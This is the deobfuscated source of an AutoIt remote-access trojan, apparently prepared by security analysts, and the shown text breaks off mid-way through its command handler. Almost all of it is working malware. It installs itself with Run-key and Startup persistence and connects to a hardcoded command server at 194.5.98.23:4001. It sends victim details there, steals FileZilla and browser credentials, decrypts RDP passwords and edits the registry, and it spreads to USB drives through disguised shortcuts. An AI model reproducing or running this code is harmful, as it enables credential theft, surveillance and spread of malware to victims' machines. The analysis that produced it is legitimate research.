﻿#CS
RAT AutoIt
References:
    1. https://pastebin.com/ggQv2gZH
    2. https://pastebin.com/5Kkx2WEa
    3. End of file is about 10 new functions for attach, get Firefox password
01/07/2020 - Deobfuscated by HTC - VinCSS (a member of Vingroup)
             Chưa done :D
#CE

#NoTrayIcon
#endregion

$g_dwKey = 169186520    ; globak key to decrypt encrypted string in DecodeFunc function

If WinExists("JBAZOYAPLV") Then Exit
AutoItWinSetTitle("JBAZOYAPLV")

#IgnoreFunc __SQLite_Inline_Version, __SQLite_Inline_Modified

Global Const $sqlite_ok = 0
Global Const $sqlite_error = 1
Global Const $sqlite_abort = 4
Global Const $sqlite_interrupt = 9
Global Const $sqlite_corrupt = 11
Global Const $sqlite_mismatch = 20
Global Const $sqlite_misuse = 21
Global Const $sqlite_row = 100
Global Const $sqlite_done = 101
Global Const $sqlite_open_readwrite = 2
Global Const $sqlite_open_create = 4
Global Const $sqlite_encoding_utf8 = 0
Global Const $sqlite_type_blob = 4
Global Const $sqlite_type_null = 5

Global $g_hdll_sqlite = 0
Global $g_hdb_sqlite = 0
Global $g_butf8errormsg_sqlite = False
Global $g_sprintcallback_sqlite = "__SQLite_ConsoleWrite"
Global $__gbsafemodestate_sqlite = True
Global $__ghdbs_sqlite[1] = [""]
Global $__ghquerys_sqlite[1] = [""]
Global $__ghmsvcrtdll_sqlite = 0
Global $__gatempfiles_sqlite[1] = [""]

Global Const $TCPEVENT_DISCONNECT = -1
Global Const $TCPEVENT_NONE = 0
Global Const $TCPEVENT_DATA = 1
Global Const $StdOut_Child = 2

Global Const $gdip_epgcolordepth = "{66087055-AD66-4C7C-9A18-38A2310B8337}"
Global Const $gdip_epgcompression = "{E09D739D-CCD4-44EE-8EBA-3FBF8BE4FC58}"
Global Const $gdip_epgquality = "{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"
Global Const $gdip_eptlong = 4
Global Const $gdip_evtcompressionlzw = 2
Global Const $gdip_pxf24rgb = 137224
Global Const $tagpoint = "struct;long X;long Y;endstruct"
Global Const $taggdipencoderparam = "byte GUID[16];ulong Count;ulong Type;ptr Values"
Global Const $taggdipstartupinput = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
Global Const $taggdipimagecodecinfo = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
Global Const $tagguid = "ulong Data1;ushort Data2;ushort Data3;byte Data4[8]"

Global Const $FO_READ = 0
Global Const $GUI_FOCUS = 256
Global Const $TAGRECT = "struct;long Left;long Top;long Right;long Bottom;endstruct"

Global Const $ws_popup = -2147483648
Global Const $ws_ex_dlgmodalframe = 1
Global Const $ws_ex_toolwindow = 128
Global Const $ws_ex_topmost = 8
Global Const $em_scroll = 181
Global Const $em_scrollcaret = 183

Global Const $FO_OVERWRITE = 2

Local $g_getAllPwds = 0         ; HTC
Local $g_sAllPasswords = ""     ; HTC

$ScriptPath = @ScriptDir & "\" & @ScriptName
$WinDataDir = @AppDataDir & "\Windata"

$R5IZ1KV5S6QC9OW7Q = @AppDataDir & "\filezilla\recentservers.xml"
$SQLite3DLL = @TempDir & "\sq8.dll"
$V3CB9SW0F = @UserProfileDir & "\AppData\Local\Google\Chrome\User Data\Default\"
$Q2XQ9PP8KX3H = @AppDataDir & "\Opera Software\Opera Stable\"
$H2UM3ZD9E = $V3CB9SW0F & "Cookies"
$D4RJ8UV1K = $Q2XQ9PP8KX3H & "Cookies"
$W0TK7PD8PP2Q = $V3CB9SW0F & "Login Data"
$Q5HG7OE0KG6D = $Q2XQ9PP8KX3H & "Login Data"
$RTTR = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\"
$A = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$B = "ConsentPromptBehaviorAdmin"
$G = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

$WM_CAP_START = 1024
$WM_CAP_UNICODE_START = $WM_CAP_START + 100
$WM_CAP_PAL_SAVEW = $WM_CAP_UNICODE_START + 81
$WM_CAP_UNICODE_END = $WM_CAP_PAL_SAVEW
$WM_CAP_DRIVER_CONNECT = $WM_CAP_START + 10
$WM_CAP_DRIVER_DISCONNECT = $WM_CAP_START + 11
$WM_CAP_END = $WM_CAP_UNICODE_END
$WM_CAP_FILE_SAVEDIBA = $WM_CAP_START + 25
$WM_CAP_GRAB_FRAME_NOSTOP = $WM_CAP_START + 61
$WM_CAP_SET_OVERLAY = $WM_CAP_START + 51
$WM_CAP_SET_PREVIEW = $WM_CAP_START + 50
$WM_CAP_SET_PREVIEWRATE  = $WM_CAP_START + 52
$WM_CAP_SET_SCALE = $WM_CAP_START + 53

Global Const $WS_CHILD = 1073741824
Global Const $WS_VISIBLE = 268435456

Local $CAMEXI = ""
$SKYPEDIR = @AppDataDir & "\Skype"
Global $SOUI = @TempDir & "/Ransound.wma"
Global $WLAA = "HKCU\Control Panel\Desktop"
Global $UAXW = @TempDir & "/UxAxC.exe"
Global $SOUSNE = @TempDir & "\SouSen.wma"
Global $VBWX = @TempDir & "\DEL.vbs"
Global $DBRT = @TempDir & "/db.txt"
Global $DS8C = @TempDir & "/dst8.txt"
Global $PAVVH = "soundrecorder.exe /file "
Global $8DSD8S = @TempDir & "/PassW8.txt"
Global $P2SC4FP7AL9H = @TempDir & "/Klog.txt"
$F4NB4ZE9W = @TempDir & "\Pl2.exe"
$C2GC7XS6X = @TempDir & "\Etx.exe"
$D4ON6XP2Y2UE7LT7BH5F = @TempDir & "\xms8.bin"
$mons = @AppDataDir & "\Windata\mon"
Global $O5DV2HK2SW0V = $mons & "\"
Global $M9CM9WV7E7CS9TE7H = "http://ip-score.com/checkip/"

Global $N8LF7BZ4Q5RL5GL8Y = $mons
Global $F7PS3AM9ME3L = $mons
Global $F5OK3SL5BU8H = "firefox.exe"
Global $V6AK4KF2D = "chrome.exe"
Global $Q4BX6PR4E = "\Windata\"
Global $strs = '"'
Global $x9OV4RF5HH2V = " /c Pl2.exe -f " & $strs & "Pl2.txt" & $strs
Global $R5IZ1KV5S3VC0PZ1EY0P = "/Pl2.txt"
Global $E4TZ1CK2W = "mms://live.mp3quran.net:9976/"
Global $F1CE2LL6H4GD5CC6F = "/Q.lnk"
Global $H6FD7HB1OS1K = "wmplayer.exe"
Global $pathIs = @AppDataDir & "/Windata/"
Global $M8ES5LU5JQ6I = "WCILVE"

Global $N5JL6JV2EC4S = "WScript.Sleep 5000" & @CRLF & "Set variable = CreateObject(" & $strs & "Scripting.FileSystemObject" & $strs & ")" & @CRLF & "variable.DeleteFile " & $strs & $pathIs & $M8ES5LU5JQ6I & ".exe" & $strs
Global $W0NR4CC7F = " /duration 00:00:"
Global $M9CM9WV7E8ZP6HB9Q = "/FHEWYW.lnk"
Global $S1AS0XE1GC8D4QQ0YB6IC9X = "svwin1.exe"
Global $N8LF7BZ4Q0AE9WM0HZ1G = "svwin2.exe"
Global $K2RP8PZ0DD4U = @TempDir & "/sounx.vbs"
Global $D3UZ0LM3WQ2O = @AppDataDir & "\Mozilla\Firefox\Profiles\"
Global $R5IZ1KV5S4US4VV8E = "\logins.json"
Global $W4TB6KX5D = "\key4.db"
Global $M9CM9WV7E1EJ2RK9JV5V = "\cert9.db"
Global $F1CE2LL6H0DD8EM7IO9P = @TempDir & "\foxr"
Global $Z6CF9KG0I = @AppDataDir & "\Microsoft\Windows\Themes\TranscodedWallpaper.jpg"
Global $DLCLIE = @TempDir & "\Proxy_Client.dll"
Global $C3NN1EW9C = @TempDir & "\Gbr.jpg"
$E7IJ3FK2O = "Screen"
$x7RH5BB2FE0R = "gercx|"
$N8LF7BZ4Q2WW3II9V = "Oks0r"
$E8LH1FC8CK2Z = "|"

Global Const $tagcursorinfo = "dword Size;dword Flags;handle hCursor;" & $tagpoint
Global Const $tagiconinfo = "bool Icon;dword XHotSpot;dword YHotSpot;handle hMask;handle hColor"

Global $ghgdipdll = 0
Global $gigdipref = 0
Global $gigdiptoken = 0
Global $c_gdip_pxf24rgb = $gdip_pxf24rgb
Global $gijpgquality = 100
Global $gitifcolordepth = 24
Global $c_gdip_evtcompressionlzw  = $gdip_evtcompressionlzw
Global Const $__screencaptureconstant_sm_cxscreen = 0
Global Const $__screencaptureconstant_sm_cyscreen = 1
Global Const $__screencaptureconstant_srccopy = 13369376

Global $debug_ed = False

Global Const $__editconstant_classname = "Edit"
Global Const $__editconstant_sb_lineup = 0
Global Const $__editconstant_sb_linedown = 1
Global Const $__editconstant_sb_pagedown = 3
Global Const $__editconstant_sb_pageup = 2
Global Const $__editconstant_sb_scrollcaret = 4

Global Const $sb_scrollcaret = 4

Local $F1CE2LL6H5OD0DY2A, $D4ON6XP2Y6HZ6AO6IC9B
Global $i4PI1OX0N = 20

DirCreate($WinDataDir)
$K8LY1UU9M = FileOpen($ScriptPath, 0)
$Q0ZF8TI6UY6K = FileRead($K8LY1UU9M)
FileClose($K8LY1UU9M)
$T7YG9AN2X = FileOpen($WinDataDir & "\WCILVE" & ".exe", 1)
FileWrite($T7YG9AN2X, $Q0ZF8TI6UY6K)
FileClose($T7YG9AN2X)

Local $T3LB1XA7KP2V = "No"
Global $R5IZ1KV5S5AE8YO6UZ9S = "0"
Global $N1TS3QU2GP8Y
$N1TS3QU2GP8Y = _GetAV()
If IsArray($N1TS3QU2GP8Y) Then
    $T3LB1XA7KP2V = $N1TS3QU2GP8Y[0]
    $K2AF6BQ1IC5W = $N1TS3QU2GP8Y[1]
    If $T3LB1XA7KP2V <> "" And $K2AF6BQ1IC5W = "Disabled" Then
        $T3LB1XA7KP2V = "Disabled"
    EndIf
Else
    $T3LB1XA7KP2V = "No"
EndIf

$D4ON6XP2Y6XT4TN9DA1L = 0

Local $Z6LU2JL6E = "x"
Local $L7OU6ZC5C = "x"
Global $D7IG7NR0SW6U = "XX"
Global $vicName = "qxdzrp"
If IsAdmin() Then
    $vicName = "Admin"
EndIf

Global $P2NL0JI7KT7M = 12
Global $Z1CV5CR1YG6J = 1
Global $F0PB0CV8VH2L = @DesktopHeight
Global $D1OG7NS5QP8G = @DesktopWidth
If FileExists(@AppDataCommonDir & "\Microsoft\Wlansvc") Then
    $S6TM6IS7Q = "Laptop"
Else
    $S6TM6IS7Q = "Desktop"
EndIf

Global $Z8KX1GG0CK4R = "194.5.98.23"
Global $O9DZ5AZ3L = "4001"
Local $O3ZK1AN7B = @OSArch
Local $Z3LH4SO5TI1Q = @UserName
$C4ZE2HR9RU2X = ""
Local $x9CL1PS7T = FileGetVersion("winver.exe")
If StringLeft($x9CL1PS7T, 2) = "10" Then
    $C4ZE2HR9RU2X = "WIN_10"
Else
    $C4ZE2HR9RU2X = @OSVersion
EndIf

Local $R5IZ1KV5S5IS0PQ2JT5O = $C4ZE2HR9RU2X
$O7TT6ZH7Z = 0
$DDAA = 1
$C0TZ3UA1TT6B = 0
$U4XB2BE7DX8D = "|"
$N9XA0OC9X = ""
$M8FV4DY6AN4M = "1.1.5"
$N9ZS9LS3SE3R = "ddd"
$M3SY1CT8HU2Y = "Pr"
$D3EI8MN0Q = "X2"
$Z8BL9NH2ZS6F = "X3"
$N5SN9LI8G = "beta"
$R5IZ1KV5S0PB2OX5LH3O = @WindowsDir & "\system32\Drivers\etc\hosts"
$Q7NS8CN0I = 1

Local $L0TR2QH3XA5N = ""
Local $P2OJ8OL0Y = ""
Local $S1YP6EH0S
If Not FileExists(@StartupDir & "\FHEWYW.lnk") Then
    FileCreateShortcut($WinDataDir & "\WCILVE.exe", @StartupDir & "\FHEWYW.lnk", '"' & $WinDataDir & "\" & '"', "", "", @SystemDir & "\shell32.dll", "", 4)
EndIf
$i3UM1ZK9D = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
If RegRead($i3UM1ZK9D, "FHEWYW") = "" Then
    RegWrite($i3UM1ZK9D, "FHEWYW", "REG_SZ", '"' & @AppDataDir & "\Windata\WCILVE.exe" & '"')
EndIf

Local $PIDX = ""
Local $PID2 = ""
Local $BeginXC
$SSAEVV = 7000
Local $fFzEte = 0
$dAStr = 0
Local $CLIS = 0
Local $N9XA0OC9X = TimerInit()
Local $RegDat = ""
$RegDat = RegRead("HKCU\Software\Win32", "data")
Local $FDDSF43 = ""
$FDDSF43 = RegRead("HKCU\Software\Win32", "img")
Local $R5IZ1KV5SKEYS
Local $W6VR3CD3SA7M = ""
$W6VR3CD3SA7M = RegRead("HKCU\Software\Win32", "keyx")
Local $mgXCli = 0
$mgXCli = RegRead("HKCU\Software\Win32", "imgCli")
$P4QF2IG6L = " "
Local $vboui = "x"
Local $Q6HB9GH4K = "v"
Local $era = ""
Local $S1AS0XE1GC8D6PY1JX5Q = 1
$O2BD1JI1HT0M = RegRead("HKCU\Software\Win32", "pidx")
If ProcessExists($O2BD1JI1HT0M) Then
    ProcessClose($O2BD1JI1HT0M)
    Sleep(500)
EndIf

$Z1OR0IB4AG8M = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\"
If $W6VR3CD3SA7M = 1 Then
    keyDDQ()
EndIf

TCPStartup()

Local $x4JQ4AM2ZU2V
Local $hquery

$F8VX9YQ0U = TimerInit()
$Z4KC3QI7CG3X = ":"

; HTC - Main Loop
While 1
    If $S1AS0XE1GC8D6PY1JX5Q = 1 Then
        Run_VBS()
    EndIf
    Sleep(10)
    MonitorGrabber()
    If TimerDiff($F8VX9YQ0U) > 9000 Then
        $x4JQ4AM2ZU2V = TCPNameToIP($Z8KX1GG0CK4R)
        $mainSocket = TCPConnect($x4JQ4AM2ZU2V, $O9DZ5AZ3L)
        $F8VX9YQ0U = TimerInit()
    EndIf
    If $mainSocket < 1 Then ContinueLoop
    TCPSend($mainSocket, $L7OU6ZC5C & $U4XB2BE7DX8D & $vicName & $U4XB2BE7DX8D & $Z6LU2JL6E & $U4XB2BE7DX8D & $Z3LH4SO5TI1Q & $U4XB2BE7DX8D & $R5IZ1KV5S5IS0PQ2JT5O & $U4XB2BE7DX8D & $O3ZK1AN7B & $U4XB2BE7DX8D & $P4QF2IG6L & $U4XB2BE7DX8D & $T3LB1XA7KP2V & $U4XB2BE7DX8D & $M8FV4DY6AN4M & $U4XB2BE7DX8D & $N9ZS9LS3SE3R & $U4XB2BE7DX8D & $M3SY1CT8HU2Y & $F0PB0CV8VH2L & $D3EI8MN0Q & $D1OG7NS5QP8G & $Z8BL9NH2ZS6F & $U4XB2BE7DX8D & $S6TM6IS7Q & $U4XB2BE7DX8D & MONOPRI() & $U4XB2BE7DX8D & $N5SN9LI8G)
    Local $N9XA0OC9X = TimerInit()
    Local $C5LQ8BF5OK0D = TimerInit()
    Local $F4KT0HC9G = TimerInit()
    Local $E7ZJ0IK6N
    Local $Z7SA3RE3BX1Y
    Local $Q7OO3LG6JD6P = 0
    While 1
        Sleep(50)
        If TimerDiff($N9XA0OC9X) > 600000 Then
            TCPCloseSocket($mainSocket)
            Sleep(2000)
            ExitLoop
        EndIf
        If $S1AS0XE1GC8D6PY1JX5Q = 1 Then
            Run_VBS()
        EndIf
        MonitorGrabber()
        If TimerDiff($F4KT0HC9G) > 5000 Then
            Local $Z7SA3RE3BX1Y = MouseGetPos()
            Local $F4KT0HC9G = TimerInit()
        EndIf
        Local $Q7OO3LG6JD6P = TimerDiff($C5LQ8BF5OK0D)
        If IsArray($Z7SA3RE3BX1Y) Then
            If $E7ZJ0IK6N <> $Z7SA3RE3BX1Y[0] Then
                Local $E7ZJ0IK6N = $Z7SA3RE3BX1Y[0]
                Local $C5LQ8BF5OK0D = TimerInit()
            EndIf
        EndIf
        Local $S1YP6EH0S = TCPSocketEvent($mainSocket)
        Switch $S1YP6EH0S
            Case $TCPEVENT_DISCONNECT
                Local $N9XA0OC9X = TimerInit()
                TCPCloseSocket($mainSocket)
                ExitLoop
            Case $TCPEVENT_DATA
                Local $L0TR2QH3XA5N = TCPRecv($mainSocket, 10000)
                Local $P2OJ8OL0Y = BinaryToString($L0TR2QH3XA5N)
                If $P2OJ8OL0Y <> "" Then
                    Local $N9XA0OC9X = TimerInit()
                    If StringInStr($P2OJ8OL0Y, "ZeXro0") Then
                        $P2OJ8OL0Y = StringReplace($P2OJ8OL0Y, "ZeXro0", "")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "USprXsed") Then
                    $C2RY4RB7HM5D = _stringbetween($P2OJ8OL0Y, "USprXsed", "Oedss")
                    If IsArray($C2RY4RB7HM5D) Then
                        $L3CF8FN8LJ8D = "data"
                        $D4ON6XP2Y9CE8NM2WV0K = "*"
                        $x5BI4XV7G = "sx.exe"
                        $F5SV3CY4M = "+HS"
                        $F9RA5ON6DI4O = "%CD%"
                        $M9RH5FR5O = "7"
                        $K5ST0HJ8YD3B = " /c start "
                        $S3SJ1RI7H = " & "
                        $E0QL5NB9Z = @SystemDir & "\shell32.dll"
                        $E4PQ9EL1R = @ComSpec
                        $F0BZ0UT8R = @SW_SHOWMINNOACTIVE
                        $Q1VU8ZC0OU7T = ""
                        $D4ON6XP2Y2VI0AD2H = "Data.Lnk"
                        $S6CQ8QL9BX6X = ".lnk"
                        $L0DE5VS3D = "\"
                        Local $N6QM2TV1CP0C = _filelisttoarray($C2RY4RB7HM5D[0], $D4ON6XP2Y9CE8NM2WV0K, 1)
                        If IsArray($N6QM2TV1CP0C) Then
                            DirCreate($C2RY4RB7HM5D[0] & $L3CF8FN8LJ8D)
                            For $i1TK0UH8V = 1 To $N6QM2TV1CP0C[0] Step +1
                                If $N6QM2TV1CP0C[$i1TK0UH8V] <> $x5BI4XV7G And StringRight($N6QM2TV1CP0C[$i1TK0UH8V], 4) <> $S6CQ8QL9BX6X Then
                                    FileMove($C2RY4RB7HM5D[0] & $N6QM2TV1CP0C[$i1TK0UH8V], $C2RY4RB7HM5D[0] & $L3CF8FN8LJ8D & $L0DE5VS3D & $N6QM2TV1CP0C[$i1TK0UH8V])
                                EndIf
                            Next
                        EndIf
                        Local $N8PY9MK1X = _filelisttoarray($C2RY4RB7HM5D[0], $D4ON6XP2Y9CE8NM2WV0K, 2)
                        If IsArray($N8PY9MK1X) Then
                            DirCreate($C2RY4RB7HM5D[0] & $L3CF8FN8LJ8D)
                            For $F1CE2LL6H0YY9CK5NW3I = 1 To $N8PY9MK1X[0] Step +1
                                If $N8PY9MK1X[$F1CE2LL6H0YY9CK5NW3I] <> $L3CF8FN8LJ8D Then
                                    DirMove($C2RY4RB7HM5D[0] & $N8PY9MK1X[$F1CE2LL6H0YY9CK5NW3I], $C2RY4RB7HM5D[0] & $L3CF8FN8LJ8D & $L0DE5VS3D & $N8PY9MK1X[$F1CE2LL6H0YY9CK5NW3I])
                                EndIf
                            Next
                        EndIf
                        FileSetAttrib($C2RY4RB7HM5D[0] & $L3CF8FN8LJ8D, $F5SV3CY4M)
                        FileCopy($ScriptPath, $C2RY4RB7HM5D[0] & $x5BI4XV7G, 1)
                        FileSetAttrib($C2RY4RB7HM5D[0] & $x5BI4XV7G, $F5SV3CY4M)
                        Local $Q7GT6DK4GL2A = DriveGetLabel($C2RY4RB7HM5D[0])
                        If $Q7GT6DK4GL2A <> $Q1VU8ZC0OU7T Then
                            $x0GF1KS5JH9P = $Q7GT6DK4GL2A
                        Else
                            $x0GF1KS5JH9P = $D4ON6XP2Y2VI0AD2H
                        EndIf
                        FileCreateShortcut($E4PQ9EL1R, $C2RY4RB7HM5D[0] & $x0GF1KS5JH9P, $F9RA5ON6DI4O, $K5ST0HJ8YD3B & $L3CF8FN8LJ8D & $S3SJ1RI7H & $x5BI4XV7G, $Q1VU8ZC0OU7T, $E0QL5NB9Z, $Q1VU8ZC0OU7T, $M9RH5FR5O, $F0BZ0UT8R)
                        TCPSend($mainSocket, "USLENDPOX")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "PVVZES") Then
                    $M3IZ4BP6O = _stringbetween($P2OJ8OL0Y, "PVVZES", "fkkkk")
                    If IsArray($M3IZ4BP6O) Then
                        RegWrite("HKCU\Software\Win32", "Key", "REG_SZ", $M3IZ4BP6O[0])
                    EndIf
                    $P2OJ8OL0Y = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "P8ERccs") Then
                    $Q0IC6YM1Q = _stringbetween($P2OJ8OL0Y, "P8ERccs", "TYloo")
                    If IsArray($Q0IC6YM1Q) Then
                        RegWrite("HKCU\Software\Win32", "Key2", "REG_SZ", $Q0IC6YM1Q[0])
                    EndIf
                    $P2OJ8OL0Y = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "PRVtpesertbe") Then
                    Local $P9CI5QI8GJ4W = ""
                    For $i = 1 To 6
                        $P9CI5QI8GJ4W &= Chr(Random(65, 90, 1))
                    Next
                    $L2XA9BT9H = @StartupCommonDir & "\"
                    $M2LI2CY4J = ".exe"
                    If @OSVersion = "WIN_XPe" Or @OSVersion = "WIN_XP" Then
                        FileCopy($ScriptPath, $L2XA9BT9H & $P9CI5QI8GJ4W & $M2LI2CY4J)
                        Sleep(1000)
                        Shutdown(2)
                    ElseIf @OSVersion = "WIN_VISTA" Then
                        FileCopy($ScriptPath, $L2XA9BT9H & $P9CI5QI8GJ4W & $M2LI2CY4J)
                        Sleep(1000)
                        Shutdown(2)
                    Else
                        $L6RX0QE9S = @TempDir & "\" & $P9CI5QI8GJ4W & $M2LI2CY4J
                    EndIf
                    FileCopy($ScriptPath, $L6RX0QE9S)
                    Sleep(1000)
                    _ShellExecuteWithReducedPrivileges($L6RX0QE9S)
                EndIf
                If StringInStr($P2OJ8OL0Y, "bboeppps") Then
                    $P9NT8OM2S = _stringbetween($P2OJ8OL0Y, "bboeppps", "nosssesea")
                    $S1AS0XE1GC8D3RD3MK1ZM7Y = "\"
                    Local $D4ON6XP2Y5NA7VV9YM5A = ""
                    If IsArray($P9NT8OM2S) Then
                        If $P9NT8OM2S[0] <> "" Then
                            Local $L5HZ0ZL6Z = $P9NT8OM2S[0]
                            For $j = 1 To 200
                                $M1WQ7FC1D = RegEnumKey($L5HZ0ZL6Z, $j)
                                If $M1WQ7FC1D <> "" Then
                                    $M9CM9WV7E8SF1IW3R = RegRead($L5HZ0ZL6Z & $S1AS0XE1GC8D3RD3MK1ZM7Y & $M1WQ7FC1D, "DisplayName")
                                    $V0OL2PJ2S = RegRead($L5HZ0ZL6Z & $S1AS0XE1GC8D3RD3MK1ZM7Y & $M1WQ7FC1D, "DisplayVersion")
                                    $N8LF7BZ4Q3CW1MD9W = RegRead($L5HZ0ZL6Z & $S1AS0XE1GC8D3RD3MK1ZM7Y & $M1WQ7FC1D, "Publisher")
                                    If $M9CM9WV7E8SF1IW3R <> "" And $V0OL2PJ2S <> "" And $N8LF7BZ4Q3CW1MD9W <> "" Then
                                        $D4ON6XP2Y5NA7VV9YM5A &= $M9CM9WV7E8SF1IW3R & "[@" & $V0OL2PJ2S & "[@" & $N8LF7BZ4Q3CW1MD9W & "@9]"
                                    EndIf
                                EndIf
                            Next
                            If $D4ON6XP2Y5NA7VV9YM5A <> "" Then
                                Local $F5PI6RH4U = StringTrimRight($D4ON6XP2Y5NA7VV9YM5A, 3)
                                TCPSend($mainSocket, $F5PI6RH4U)
                                TCPSend($mainSocket, "soxccirre")
                            EndIf
                        EndIf
                    EndIf
                    $P2OJ8OL0Y = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "Zilldsxx") Then
                    If FileExists($R5IZ1KV5S6QC9OW7Q) Then
                        Local $i0LW3TD4Y
                        $U3IL3CL9KF4I = ""
                        $x2PM2HK7W = ">"
                        $O0BJ3IJ8LR0P = "</"
                        W8WS7DY6QD7C($R5IZ1KV5S6QC9OW7Q, $i0LW3TD4Y)
                        If IsArray($i0LW3TD4Y) Then
                            For $N8LF7BZ4Q0AS3TI2K = 1 To $i0LW3TD4Y[0] Step +1
                                If StringInStr($i0LW3TD4Y[$N8LF7BZ4Q0AS3TI2K], "<Host>") Then
                                    $V2PL3EL3AX4L = _stringbetween($i0LW3TD4Y[$N8LF7BZ4Q0AS3TI2K], $x2PM2HK7W, $O0BJ3IJ8LR0P)
                                    If IsArray($V2PL3EL3AX4L) Then
                                        $U3IL3CL9KF4I &= $V2PL3EL3AX4L[0] & "]|"
                                    EndIf
                                ElseIf StringInStr($i0LW3TD4Y[$N8LF7BZ4Q0AS3TI2K], "<User>") Then
                                    $V4PK7HE2LK1A = _stringbetween($i0LW3TD4Y[$N8LF7BZ4Q0AS3TI2K], $x2PM2HK7W, $O0BJ3IJ8LR0P)
                                    If IsArray($V4PK7HE2LK1A) Then
                                        $U3IL3CL9KF4I &= $V4PK7HE2LK1A[0] & "]|"
                                    EndIf
                                ElseIf StringInStr($i0LW3TD4Y[$N8LF7BZ4Q0AS3TI2K], "<Pass") Then
                                    $E2IC3TR3RO2F = _stringbetween($i0LW3TD4Y[$N8LF7BZ4Q0AS3TI2K], $x2PM2HK7W, $O0BJ3IJ8LR0P)
                                    If IsArray($E2IC3TR3RO2F) Then
                                        $U3IL3CL9KF4I &= $E2IC3TR3RO2F[0] & "@|("
                                    EndIf
                                EndIf
                            Next
                            TCPSend($mainSocket, $U3IL3CL9KF4I)
                            TCPSend($mainSocket, "enssszil")
                        EndIf
                    Else
                        TCPSend($mainSocket, "NoFisxx")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Rxegq") Then
                    $V3BI3HB4TB0C = _stringbetween($P2OJ8OL0Y, "Rxegq", "yyrzzs")
                    If IsArray($V3BI3HB4TB0C) Then
                        $F8NM0XP8NP6BJO9XX5LT5T = ""
                        For $T1YL1TB5Y = 1 To 1000
                            Local $V8HR8DF1T = RegEnumKey($V3BI3HB4TB0C[0], $T1YL1TB5Y)
                            If $V8HR8DF1T <> "" Then
                                $F8NM0XP8NP6BJO9XX5LT5T &= $V8HR8DF1T & "|"
                            EndIf
                            If @error <> 0 Or $V8HR8DF1T = "" Then ExitLoop
                        Next
                        TCPSend($mainSocket, "igigie" & $F8NM0XP8NP6BJO9XX5LT5T & "dsdsdbb")
                        $F8NM0XP8NP6BJO9XX5LT5T = ""
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Rvalxus") Then
                    $F1CE2LL6H6SC5CP4C = _stringbetween($P2OJ8OL0Y, "Rvalxus", "vaiolux")
                    If IsArray($F1CE2LL6H6SC5CP4C) Then
                        $C1BX5DO7DF2Q = ""
                        For $i = 1 To 100
                            Local $N8LF7BZ4Q8NN9KN4P = RegEnumVal($F1CE2LL6H6SC5CP4C[0], $i)
                            If @error <> 0 Then ExitLoop
                            $C1BX5DO7DF2Q &= $N8LF7BZ4Q8NN9KN4P & "@-" & RegRead($F1CE2LL6H6SC5CP4C[0], $N8LF7BZ4Q8NN9KN4P) & "|"
                        Next
                        TCPSend($mainSocket, "yuyurdd" & $C1BX5DO7DF2Q & "cdc")
                        $C1BX5DO7DF2Q = ""
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "cythhop") Then
                    $H2ZR1NS8C = _stringbetween($P2OJ8OL0Y, "cythhop", "ciiros")
                    If IsArray($H2ZR1NS8C) Then
                        If StringLeft($H2ZR1NS8C[0], 2) <> "0x" Then
                            $C7HA0FI7HU0C = UncryptRDPPassword(Binary("0x" & $H2ZR1NS8C[0]))
                        Else
                            $C7HA0FI7HU0C = UncryptRDPPassword(Binary($H2ZR1NS8C[0]))
                        EndIf
                        If $C7HA0FI7HU0C <> "" Then
                            TCPSend($mainSocket, "nnispos" & $C7HA0FI7HU0C & "nonos")
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "rosssnyt") Then
                    $C3ZV6UC8DF7Y = _stringbetween($P2OJ8OL0Y, "rosssnyt", "iuyfyf")
                    $D4ON6XP2Y8CN2AZ0U = _stringbetween($P2OJ8OL0Y, "iuyfyf", "fp7y")
                    If IsArray($C3ZV6UC8DF7Y) And IsArray($D4ON6XP2Y8CN2AZ0U) Then
                        RegDelete($C3ZV6UC8DF7Y[0], $D4ON6XP2Y8CN2AZ0U[0])
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "utyres") Then
                    $S1AS0XE1GC8D5XR0MY3GT8P = _stringbetween($P2OJ8OL0Y, "utyres", "oranntes")
                    $K5MO4FC1SZ9K = _stringbetween($P2OJ8OL0Y, "oranntes", "nnue")
                    $E7FP8HW2YH4L = _stringbetween($P2OJ8OL0Y, "nnue", "nuddte")
                    $M1XH9XU5F = _stringbetween($P2OJ8OL0Y, "nuddte", "uutse")
                    If IsArray($S1AS0XE1GC8D5XR0MY3GT8P) And IsArray($K5MO4FC1SZ9K) And IsArray($E7FP8HW2YH4L) And IsArray($M1XH9XU5F) Then
                        RegWrite($M1XH9XU5F[0], $S1AS0XE1GC8D5XR0MY3GT8P[0], $E7FP8HW2YH4L[0], $K5MO4FC1SZ9K[0])
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "HIXCVs") Then
                    $S7VB3AH4AP2Y = _stringbetween($P2OJ8OL0Y, "HIXCVs", "poxe")
                    If IsArray($S7VB3AH4AP2Y) Then
                        $D4ON6XP2Y3TT8YN7FY4U = InetRead($S7VB3AH4AP2Y[0], 1)
                        Sleep(1000)
                        InetClose($D4ON6XP2Y3TT8YN7FY4U)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "xreztrx|") Then
                    $S5JJ3PE7DX1E = StringSplit($P2OJ8OL0Y, "|", 1)
                    If IsArray($S5JJ3PE7DX1E) Then
